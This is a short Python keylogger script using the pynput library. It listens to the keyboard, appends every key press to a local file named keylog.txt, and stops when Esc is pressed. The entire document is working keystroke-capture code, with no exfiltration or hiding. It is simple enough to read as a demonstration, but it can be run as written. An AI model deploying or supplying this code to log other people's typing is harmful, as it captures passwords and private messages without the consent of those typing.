import pynput
from pynput.keyboard import Key, Listener

# Create a log file
log_file = "keylog.txt"

def on_press(key):
    # Log the key press
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

def on_release(key):
    # Stop the keylogger when the 'esc' key is pressed
    if key == Key.esc:
        return False

# Create a keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()